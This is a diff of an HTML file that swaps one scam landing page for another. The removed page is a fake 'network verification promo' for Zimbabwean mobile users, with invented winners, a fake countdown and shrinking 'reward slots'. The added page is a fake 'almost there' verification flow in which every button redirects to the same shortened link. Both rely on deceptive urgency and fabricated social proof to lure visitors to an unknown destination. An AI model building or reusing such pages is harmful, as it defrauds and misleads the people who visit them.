@@ -1,377 +1,506 @@
-<!--
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Almost there · Continue</title>
+  <style>
+    /* ── reset & base ── */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
 
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f8fafc;
+      padding: 20px;
+      position: relative;
+    }
 
-<title>Network Verification Promo</title>
+    /* subtle dot pattern */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: radial-gradient(#94a3b8 1.2px, transparent 1.2px);
+      background-size: 32px 32px;
+      opacity: 0.15;
+      pointer-events: none;
+    }
 
-<style>
+    /* ── card ── */
+    .card {
+      background: #ffffff;
+      max-width: 480px;
+      width: 100%;
+      padding: 44px 34px 40px;
+      border-radius: 40px;
+      box-shadow: 0 24px 56px -12px rgba(0, 0, 0, 0.06), 0 8px 24px rgba(0, 0, 0, 0.02);
+      border: 1px solid rgba(226, 232, 240, 0.7);
+      backdrop-filter: blur(2px);
+      transition: all 0.2s ease;
+      position: relative;
+      z-index: 2;
+      text-align: center;
+    }
 
-body{
-font-family:Arial,sans-serif;
-background:linear-gradient(135deg,#1a3cff,#ffcc00);
-margin:0;
-padding:0;
-text-align:center;
-animation:bgshift 10s infinite alternate;
-}
+    /* ── progress dots ── */
+    .step-indicator {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 28px;
+    }
 
-@keyframes bgshift{
-0%{background:linear-gradient(135deg,#1a3cff,#ffcc00);}
-100%{background:linear-gradient(135deg,#ffcc00,#1a3cff);}
-}
+    .step-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 40px;
+      background: #e2e8f0;
+      transition: 0.25s ease;
+    }
 
-.header{
-background:#000;
-color:#ffcc00;
-padding:18px;
-font-size:22px;
-font-weight:bold;
-}
+    .step-dot.active {
+      background: #0f973d;
+      width: 32px;
+    }
 
-.container{
-background:#fff;
-max-width:420px;
-margin:40px auto;
-padding:30px;
-border-radius:12px;
-box-shadow:0 10px 30px rgba(0,0,0,0.25);
-}
+    .step-dot.done {
+      background: #0f973d;
+      opacity: 0.5;
+    }
 
-h2{
-margin-top:0;
-color:#222;
-}
+    .step-label {
+      font-size: 13px;
+      font-weight: 500;
+      color: #94a3b8;
+      letter-spacing: 0.3px;
+      margin-left: 4px;
+    }
 
-button{
-width:100%;
-padding:14px;
-margin-top:12px;
-font-size:16px;
-border:none;
-border-radius:10px;
-cursor:pointer;
-transition:0.2s;
-box-shadow:0 4px 12px rgba(0,0,0,0.2);
-font-weight:bold;
-}
+    /* ── icon ── */
+    .icon-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
 
-/* ✅ Zimbabwe Network Colors */
-.Econet{
-background:#00A651;
-color:#fff;
-}
+    .circle-bg {
+      width: 88px;
+      height: 88px;
+      background: #eef9f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-.NetOne{
-background:#0033A0;
-color:#fff;
-}
+    .emoji-big {
+      font-size: 44px;
+      line-height: 1;
+    }
 
-.Telecel{
-background:#E60000;
-color:#fff;
-}
+    /* ── typography ── */
+    h1 {
+      font-size: 30px;
+      font-weight: 700;
+      color: #0b1a2b;
+      letter-spacing: -0.3px;
+      margin-bottom: 10px;
+    }
 
-button:hover{
-transform:scale(1.03);
-opacity:0.95;
-}
+    .subhead {
+      font-size: 17px;
+      color: #475569;
+      line-height: 1.6;
+      max-width: 360px;
+      margin: 0 auto 18px;
+    }
 
-.progress{
-width:100%;
-background:#ddd;
-height:12px;
-border-radius:6px;
-margin-top:20px;
-overflow:hidden;
-}
+    .highlight-box {
+      background: #f9fbfd;
+      border-radius: 20px;
+      padding: 20px 18px;
+      margin: 22px 0 28px;
+      border: 1px solid #e9edf2;
+      text-align: left;
+    }
 
-.bar{
-width:0%;
-height:12px;
-background:linear-gradient(90deg,#1a3cff,#ffcc00);
-}
+    .highlight-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 8px 0;
+      color: #1e293b;
+      font-size: 15px;
+      font-weight: 450;
+      border-bottom: 1px solid #ecf1f6;
+    }
 
-.notice{
-font-size:13px;
-color:#777;
-margin-top:20px;
-}
+    .highlight-row:last-child {
+      border-bottom: none;
+    }
 
-.slots{
-color:red;
-font-weight:bold;
-margin:10px 0;
-font-size:15px;
-}
+    .check-icon {
+      color: #0f973d;
+      font-weight: 700;
+      font-size: 18px;
+      width: 24px;
+      display: inline-block;
+    }
 
-.timer{
-font-weight:bold;
-margin-bottom:15px;
-color:#1a3cff;
-}
+    /* ── main CTA ── */
+    .btn-primary {
+      width: 100%;
+      background: linear-gradient(145deg, #0f973d, #0b7a33);
+      border: none;
+      padding: 18px 20px;
+      border-radius: 60px;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      transition: 0.2s ease;
+      box-shadow: 0 12px 28px -8px rgba(15, 151, 61, 0.25);
+      margin-top: 6px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
 
-.ticker{
-background:#fff;
-color:#000;
-padding:12px;
-font-size:14px;
-font-weight:bold;
-border-top:2px solid #1a3cff;
-border-bottom:2px solid #1a3cff;
-position:fixed;
-bottom:0;
-width:100%;
-}
+    .btn-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 18px 34px -12px rgba(15, 151, 61, 0.35);
+    }
 
-</style>
+    .btn-primary:active {
+      transform: scale(0.97);
+    }
 
+    .btn-primary .arrow {
+      transition: transform 0.2s ease;
+      display: inline-block;
+    }
+
+    .btn-primary:hover .arrow {
+      transform: translateX(4px);
+    }
+
+    .note {
+      font-size: 13px;
+      color: #94a3b8;
+      margin-top: 20px;
+      letter-spacing: 0.2px;
+    }
+
+    /* ── step 2 (hidden by default) ── */
+    #step2 {
+      display: none;
+      animation: fadeUp 0.3s ease;
+    }
+
+    #step1 {
+      display: block;
+      animation: fadeUp 0.25s ease;
+    }
+
+    @keyframes fadeUp {
+      0% { opacity: 0; transform: translateY(10px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .question-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #0b1a2b;
+      margin: 14px 0 8px;
+    }
+
+    .question-sub {
+      color: #475569;
+      font-size: 16px;
+      margin-bottom: 28px;
+    }
+
+    .choice-group {
+      display: flex;
+      gap: 16px;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin: 18px 0 12px;
+    }
+
+    .choice-btn {
+      background: white;
+      border: 1.5px solid #dce2ea;
+      padding: 14px 38px;
+      border-radius: 60px;
+      font-size: 18px;
+      font-weight: 500;
+      color: #1e293b;
+      cursor: pointer;
+      transition: 0.15s ease;
+      min-width: 120px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.01);
+    }
+
+    .choice-btn:hover {
+      border-color: #0f973d;
+      background: #f6fcf9;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 16px -8px rgba(15, 151, 61, 0.12);
+    }
+
+    .choice-btn:active {
+      transform: scale(0.96);
+    }
+
+    .choice-btn.yes {
+      background: #eafaf1;
+      border-color: #0f973d;
+    }
+
+    .choice-btn.no {
+      background: #f8fafc;
+      border-color: #dce2ea;
+    }
+
+    .choice-btn.yes:hover {
+      background: #d5f0e0;
+    }
+
+    .choice-btn.no:hover {
+      background: #f1f5f9;
+      border-color: #94a3b8;
+    }
+
+    .choice-btn.selected-yes {
+      background: #0f973d !important;
+      border-color: #0f973d !important;
+      color: white !important;
+      box-shadow: 0 8px 18px -6px rgba(15, 151, 61, 0.4);
+      transform: scale(1.02);
+    }
+
+    .choice-btn.selected-no {
+      background: #475569 !important;
+      border-color: #334155 !important;
+      color: white !important;
+      box-shadow: 0 8px 18px -6px rgba(71, 85, 105, 0.3);
+      transform: scale(1.02);
+    }
+
+    .choice-btn:disabled {
+      cursor: default;
+      opacity: 0.9;
+    }
+
+    .confirmation-badge {
+      display: inline-block;
+      margin-top: 14px;
+      padding: 10px 24px;
+      border-radius: 60px;
+      font-weight: 600;
+      font-size: 15px;
+      background: #f1f5f9;
+      color: #1e293b;
+      border: 1px solid #dce2ea;
+      animation: fadeUp 0.25s ease;
+    }
+
+    .confirmation-badge.yes-badge {
+      background: #eafaf1;
+      border-color: #0f973d;
+      color: #0b7a33;
+    }
+
+    .confirmation-badge.no-badge {
+      background: #f1f5f9;
+      border-color: #94a3b8;
+      color: #1e293b;
+    }
+
+    /* ── responsive ── */
+    @media (max-width: 460px) {
+      .card { padding: 32px 20px; }
+      h1 { font-size: 26px; }
+      .choice-btn { min-width: 100px; padding: 12px 24px; }
+    }
+  </style>
 </head>
-
 <body>
+  <div class="card" role="main">
 
-<div class="header">
-Mobile Network Verification Promo
-</div>
+    <!-- ===== STEP 1 – "You're almost there" ===== -->
+    <div id="step1">
+      <div class="step-indicator">
+        <span class="step-dot done"></span>
+        <span class="step-dot done"></span>
+        <span class="step-dot active"></span>
+        <span class="step-dot"></span>
+        <span class="step-label">Step 3 of 4</span>
+      </div>
 
-<div class="container" id="mainBox">
+      <div class="icon-wrapper">
+        <div class="circle-bg">
+          <span class="emoji-big">🚀</span>
+        </div>
+      </div>
 
-<div class="timer">
-⏳ Offer expires in <span id="countdown">05:30:00</span>
-</div>
+      <h1>You're almost there!</h1>
+      <p class="subhead">
+        Click the button below to continue and complete your verification.
+      </p>
 
-<div class="slots">
-⚡ Only <span id="slots">100</span> reward slots left today
-</div>
+      <div class="highlight-box">
+        <div class="highlight-row">
+          <span class="check-icon">✓</span>
+          <span>Verification in progress</span>
+        </div>
+        <div class="highlight-row">
+          <span class="check-icon">✓</span>
+          <span>Final step before confirmation</span>
+        </div>
+        <div class="highlight-row">
+          <span class="check-icon">✓</span>
+          <span>Secure &amp; fast process</span>
+        </div>
+      </div>
 
-<h2>Select the network you use</h2>
+      <button class="btn-primary" id="continueBtn">
+        CONTINUE
+        <span class="arrow">→</span>
+      </button>
+      <p class="note">By continuing, you agree to the verification terms.</p>
+    </div>
 
-<p>Verify your number to unlock exclusive rewards instantly.</p>
+    <!-- ===== STEP 2 – question ===== -->
+    <div id="step2">
+      <div class="step-indicator">
+        <span class="step-dot done"></span>
+        <span class="step-dot done"></span>
+        <span class="step-dot done"></span>
+        <span class="step-dot active"></span>
+        <span class="step-label">Step 4 of 4</span>
+      </div>
 
-<button class="Econet" onclick="verifyNetwork('Econet')">Econet</button>
-<button class="Telecel" onclick="verifyNetwork('Telecel')">Telecel</button>
-<button class="NetOne" onclick="verifyNetwork('NetOne')">NetOne</button>
+      <div class="icon-wrapper" style="margin-bottom: 6px;">
+        <div style="width: 70px; height: 70px; background: #f0f7fe; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+          <span style="font-size: 28px;">🌍</span>
+        </div>
+      </div>
 
-<p class="notice">
-Verification system scans network eligibility before showing rewards
-</p>
+      <div class="question-title">Are you from South Africa?</div>
+      <p class="question-sub">Select an option to finalize.</p>
 
-</div>
+      <div class="choice-group">
+        <button class="choice-btn yes" id="yesBtn">Yes</button>
+        <button class="choice-btn no" id="noBtn">No</button>
+      </div>
 
-<div class="ticker" id="testimonialTicker">
-+263***4521 just received 10GB bonus
-</div>
+      <div id="confirmationContainer" style="min-height: 50px; margin-top: 6px;"></div>
 
-<script>
+      <p class="note" style="margin-top: 12px;">By choosing, you will be redirected.</p>
+    </div>
+  </div>
 
-function verifyNetwork(network){
+  <script>
+    (function() {
+      const MAIN_LINK = "https://ln.run/1OuUu";
 
-const box=document.getElementById("mainBox");
+      const step1 = document.getElementById('step1');
+      const step2 = document.getElementById('step2');
+      const continueBtn = document.getElementById('continueBtn');
+      const yesBtn = document.getElementById('yesBtn');
+      const noBtn = document.getElementById('noBtn');
+      const confirmationContainer = document.getElementById('confirmationContainer');
 
-box.innerHTML=`
-<h2>Verifying ${network} Network</h2>
-<p id="stepText">Detecting network...</p>
+      let isProcessing = false;
 
-<div class="progress">
-<div class="bar" id="bar"></div>
-</div>
-`;
+      // ── show step 2 ──
+      function showStep2() {
+        step1.style.display = 'none';
+        step2.style.display = 'block';
+        const card = document.querySelector('.card');
+        if (card) card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        resetSelection();
+      }
 
-let progress=0;
+      // ── reset selection state ──
+      function resetSelection() {
+        yesBtn.classList.remove('selected-yes', 'selected-no');
+        noBtn.classList.remove('selected-yes', 'selected-no');
+        yesBtn.disabled = false;
+        noBtn.disabled = false;
+        confirmationContainer.innerHTML = '';
+        isProcessing = false;
+      }
 
-const steps=[
-"Detecting network...",
-"Validating reward eligibility...",
-"Checking remaining slots...",
-"Preparing activation..."
-];
+      // ── show confirmation badge ──
+      function showConfirmation(choice) {
+        const badge = document.createElement('div');
+        badge.className = `confirmation-badge ${choice === 'yes' ? 'yes-badge' : 'no-badge'}`;
+        const label = choice === 'yes' ? 'Yes' : 'No';
+        badge.innerHTML = `✅ You selected: <strong>${label}</strong>`;
+        confirmationContainer.innerHTML = '';
+        confirmationContainer.appendChild(badge);
+      }
 
-let interval=setInterval(function(){
+      // ── redirect after showing confirmation ──
+      function redirectWithConfirmation(choice) {
+        if (isProcessing) return;
+        isProcessing = true;
 
-progress+=5;
+        yesBtn.disabled = true;
+        noBtn.disabled = true;
 
-document.getElementById("bar").style.width=progress+"%";
+        if (choice === 'yes') {
+          yesBtn.classList.add('selected-yes');
+          noBtn.classList.remove('selected-yes', 'selected-no');
+        } else {
+          noBtn.classList.add('selected-no');
+          yesBtn.classList.remove('selected-yes', 'selected-no');
+        }
 
-if(progress==25){
-document.getElementById("stepText").innerText=steps[1];
-}
+        showConfirmation(choice);
 
-if(progress==50){
-document.getElementById("stepText").innerText=steps[2];
-}
+        setTimeout(() => {
+          window.location.href = MAIN_LINK;
+        }, 800);
+      }
 
-if(progress==75){
-document.getElementById("stepText").innerText=steps[3];
-}
+      // ── event listeners ──
+      continueBtn.addEventListener('click', showStep2);
 
-if(progress>=100){
+      yesBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (isProcessing) return;
+        redirectWithConfirmation('yes');
+      });
 
-clearInterval(interval);
+      noBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (isProcessing) return;
+        redirectWithConfirmation('no');
+      });
 
-document.getElementById("stepText").innerText="Redirecting...";
+      // ── initial state ──
+      step1.style.display = 'block';
+      step2.style.display = 'none';
+      resetSelection();
 
-setTimeout(function(){
-window.location.href="https://ln.run/1OuUu";
-},1000)
-
-}
-
-},200)
-
-}
-
-const testimonies=[
-"+263***4521 just received 10GB and $20 airtime",
-"+263***9932 just received 5GB and $10 airtime",
-"+263***7710 just received 10GB and $30 airtime",
-"+263***6284 just received 2GB and $5 airtime",
-"+263***3345 just received 5GB and $10 airtime",
-"+263***9921 just received 10GB and $30 airtime"
-]
-
-setInterval(()=>{
-const random=Math.floor(Math.random()*testimonies.length)
-document.getElementById("testimonialTicker").innerText=testimonies[random]
-},4000)
-
-let slots=23
-
-setInterval(()=>{
-if(slots>7){
-slots--
-document.getElementById("slots").innerText=slots
-}
-},15000)
-
-let time=19800
-
-const timer=setInterval(()=>{
-let h=Math.floor(time/3600)
-let m=Math.floor((time%3600)/60)
-let s=time%60
-
-document.getElementById("countdown").innerText=
-String(h).padStart(2,'0')+":"+
-String(m).padStart(2,'0')+":"+
-String(s).padStart(2,'0')
-
-time--
-
-if(time<=0){
-clearInterval(timer)
-}
-
-},1000)
-
-</script>
-
-</body>
-</html>
--->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Quick Question</title>
-
-<style>
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial,sans-serif;
-}
-
-body{
-background:#0f172a;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-padding:20px;
-color:white;
-}
-
-.box{
-background:#111827;
-width:100%;
-max-width:400px;
-padding:35px 25px;
-border-radius:20px;
-text-align:center;
-box-shadow:0 10px 30px rgba(0,0,0,0.4);
-}
-
-h1{
-font-size:28px;
-margin-bottom:15px;
-}
-
-p{
-font-size:16px;
-color:#cbd5e1;
-margin-bottom:30px;
-line-height:1.5;
-}
-
-.btns{
-display:flex;
-gap:15px;
-}
-
-button{
-flex:1;
-padding:15px;
-border:none;
-border-radius:12px;
-font-size:17px;
-font-weight:bold;
-cursor:pointer;
-transition:0.3s;
-}
-
-.yes{
-background:#22c55e;
-color:#000;
-}
-
-.no{
-background:#ef4444;
-color:#fff;
-}
-
-button:hover{
-transform:scale(1.03);
-}
-</style>
-</head>
-
-<body>
-
-<div class="box">
-
-<h1>Quick Question</h1>
-
-<p>
-Would you like to answer a few simple questions and receive a reward today?
-</p>
-
-<div class="btns">
-<button class="yes" onclick="goOffer()">YES</button>
-<button class="no" onclick="goOffer()">NO</button>
-</div>
-
-</div>
-
-<script>
-function goOffer(){
-window.location.href="https://ln.run/1OuUu";
-}
-</script>
-
+      console.log('✅ "Almost there" flow (English) ready');
+    })();
+  </script>
 </body>
 </html>
